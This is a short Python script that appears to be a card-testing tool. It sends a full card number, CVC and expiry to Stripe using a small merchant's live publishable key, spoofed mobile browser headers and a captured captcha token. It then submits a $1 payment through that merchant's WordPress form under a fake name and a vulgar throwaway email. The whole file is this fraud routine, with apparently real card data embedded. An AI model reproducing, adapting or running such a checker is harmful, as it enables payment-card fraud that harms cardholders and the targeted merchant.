
import requests

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 15; 23053RN02A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

data = 'type=card&card[number]=4410751120255199&card[cvc]=696&card[exp_month]=12&card[exp_year]=30&guid=f7976440-68ec-49d1-952d-9889071b4b5b1f984e&muid=be981b40-1455-45ad-8878-ab3e4e2c179ab79b99&sid=ad6245c3-dad0-4363-9d3a-dac5610d1abf6b33b7&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+card-element&referrer=https%3A%2F%2Fallcoughedup.com&time_on_page=97121&client_attribution_metadata[client_session_id]=98b71825-5b10-449f-b361-bca55a8d7d01&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY0NjIxNDYxLCJjZGF0YSI6Im5HTFozaGZNM2pZU0J5aEtENkFMQWZPMHZvekJSeHZBblF0ZTFDNFhWUXg5Z1ZNQW9jblUzTEMxTVlycDd2UW5tTitmQVlSMFVleTZwSW1PNldJWU9BNlo2bEZSQ0hjNVJPUHRhSVN2NGVJNkpSYXhadDFNVkhDM3Y4UkQrVjJHRjBrWDBWUStUbS85NGZGNHk0bkxPQnI4YzN2Tjg0bXYreXN0VmZaMFpOWE9BK1ZjSGFFaER4UjJLZ2JyZGdKQXNmRkcwaklvcEEwNzkrNWIiLCJwYXNza2V5IjoiSHVLaFVNb2FwTFV4ZXhjdEs0b3IzQ1JvRFBUeWxtbzE1MkRHVUhFYldnN016QVZaZzYxYkRUcVlrQ1dBZTIwQmpwRTZNeHAyOU5aTjRyUzc4K0RuNmNleWlidGNxVnNXaXRoa3Y5WnZiMzhRVlAvcnY3aTFaeFAwVkcrU0FHMjBhbkphWUplek8ySjRKZ2lNM0RXbDErd1BQSkJ6S0ZwWGI1UTlBSDVZOTNuYmpOU2xZdHAvYnk3L0Vmd0xjSWtJdnk2Qm5kSTF6d0lYNW1KcjhwN0ZMN1N5azhqRU9NRjlra200VjMwNEp0UC8vREppaFpnaWVpMVB1bzlKWUV5d0JMZ1FkZmhCVjhDcW10SGVVcERwWGxWNW9GSVpCQWxJYXBBMmdhS0dMcDFXTThRRXJGUlBDUk9EVHI5dzA1bG5qcGFGUFFqM1pVUjdoZjNnNy94MXB4REFrT1hEZmtaczNhM25GMThEdFNJTXF3TUtNZmVpS1EvRzB1NHd0OENIQVlJdDdhM1RqRVNUNWVHdTdFTm44c3Y1OHpGblA5by9CSlQ2QWVsN0grek9XQW1CSnp6S2FYcHQxZVlnQ1lvTmlhS0F1YXhjcFpkSUw2TjFmS1YzbEtnNXp0VEI0TDJ0S2FTajBkZU1Lc0FlRWE0dCtiQWVpRERtcThzQkJGMG9NaTcrUkM5V2V2aDNSZk5zc3hEd1Nxcm9EYVBpUzZULzE0U3ZHZTNUWFRyMW1HM0NjSmpnNnpOdGVTK3J5eElQN0g3cWxuNzdmbHhxMFN5WEpqcXdNWXFiT1pKbVB3R0FNdTV5MlEzME9IU1gvWFQ5K2wyeFZDWm1VM2J1ZkhJRDROTm1tcEk0TXRFa2t1MmhTKzFwR0VZMFByTVBpSWJzQWNsSUtQU0pNL2pTTXZ6WmhCa1I1bW11d09QaVl5RXBpMC9sNlROM05qOHRHTlUxekVUbjZtMkMvQW9kdEM5dXRWZVlrT1ZuMGFDeDJtdUc5ODJaQS9aVWdCTmxvam9uRkhCdEZSeUpZOFFick9ITWxEdUhFRnJTNVdzMEN3WlVmVU5jT2RCRFVtbng5ajJVbTVWQUJ5U1c2dnZKenRZdFBhR2xNTXpuZlNGTExwQlVGRnhSUHdGdVRxRWUrMmF3R3dMWUVFRHlSU2VPamFLbHl6d3IxZ3I5dWRQYXlqeWx2eGVoV2VFN2FFT056Qzc4bTBERDJ4ZzlIeG44ZERGdEg2Lzg5dDlwbmlINVdEQzJwVDFKSC9tNjJJbXZwWHBac01kaTR2MWdPZ0Y2a1g3YnhyOC9HZjlkVFJXUWhjZVdCL0RHaDFWRDMrb0VNTzVuSUJJU0VIU3lNaXpoVVJZNVI0QTl2ZE16d3R1VlMvNVZYUHpsV1I0cUVKbzgrNDRYUG1RWXZBQ1VMYWlEMmt5MDU1UzdXZnpkNXRYOE9lWVJYeUlZMmpSdHdQZktNQnlRVHVVbjF1VlM5TU9NN2FHS0JoelBQN0JqYnlqYzBqVnhMbk9KYUx6OUpnL0pJQi8xa1FpdUJRTzJSTVFvRytMSVJWMmRzU1ZtVUpmMk5COUhzUDZ2NmVveHM5WUNmRWxpRCtaZysyVEUrdkNvU295ZGhHUzJBdE5HaVozbEhtWGNkT2VRNWw2MFdwWGMvS2czUHZUclFPWUFrVUg1WkZES3Z4VHJmUWFJNTl3L0ZrUWY1ZXNpZVFEK242TzhhZG5BNFBPN3JhUmp0VFZHVzd4enNnNnpNNWFrNEVudG4yOTlIV1ZHTXdOVlRxK0h1emtiL1pwWFBqaVhKWXV6K05CYUMzRTVxRWxCNm41MUYyNjNrSmRHV2F0RWF3N1h0alpxRG9jS3lxZWRwZVhFNzNkdU5JZHcwK1pqaXBLZ2d4TThCTUlPZGVrS2JRV0RONVlROVJITCswTmxRQmx6OEF3K2JvTU9JYnFPR1lENGlEMVVlQVNJTVh3RjN6cThKTEg5KzAvWW9aVVBpa0FWeUwrNUtWa2NaK1EySjB0SXk0SFNDeHZNb201U3VtalVGRC9CZkVYYzhoR2Nod2U0SEVMaDloeTdQTVRRdUtWZSt1RWE1L2hMV2xTeXFOblc0T1pTZURyMlR2ZkVTV0lXQzBGWndKTXMwem9jMExvWWJHUW9KL094eTVMSEg2ZEo0R24wb25XaUNoM1diMmxVSXZwbWg3a3R2YXdXVlhrUXdwT2lNMVRHMDdCK1R0bGFEK3NXUFVkTXF1dVJJaVhiVm9Qa3RHaGo0OEphRGE0QitCYTVrUllYeVJBMzhVQklJUnpYdE43dWlTbDFqSnRGRmZreXpEcDZ3cUVIbElQMlB5a3ROY2wyQXVOMUM2dnVJUGIxc3FGRFlJZ0xONzI5WUhyWXAvZGxDMHNGS3kvVmp1YjVMcEwwNExHTlRRdVFKdktqWmY1Vm8raWFwTkV3NG5vRnBaU3lhUDdtSG5PaTBnQ1RpYWVZc3JnUUlkUWVPY2pTbW4zUW5mYWlJcTZEWlg4NTc4dkVqb1ZjUHZyY1NUTFN3SENZKzMrMHZFaXBpNXZUIiwia3IiOiJjNmVlYjQ0Iiwic2hhcmRfaWQiOjMzOTUxMDMwM30.YJZioVEbewE1iMWRWFfX_NeGJOjBEe8Y2zXxcA8hi3U'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


cookies = {
    '__stripe_mid': 'be981b40-1455-45ad-8878-ab3e4e2c179ab79b99',
    '__stripe_sid': 'ad6245c3-dad0-4363-9d3a-dac5610d1abf6b33b7',
}

headers = {
    'authority': 'allcoughedup.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://allcoughedup.com',
    'referer': 'https://allcoughedup.com/registry/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 15; 23053RN02A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    't': '1764621341845',
}

data = {
    'data': '__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=1a2065ad46&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=BabaPro&email=sikimleyuxles%40gmail.com&custom-payment-amount=1&description=Abilere%20Selam&payment_method=stripe&__entry_intermediate_hash=bebce7c71f3485cfec72250aa3977e94&__stripe_payment_method_id=pm_1SZdov07g9MK9dNZ8CxiWI7C',
    'action': 'fluentform_submit',
    'form_id': '4',
}

response = requests.post(
    'https://allcoughedup.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)


print(response.text)
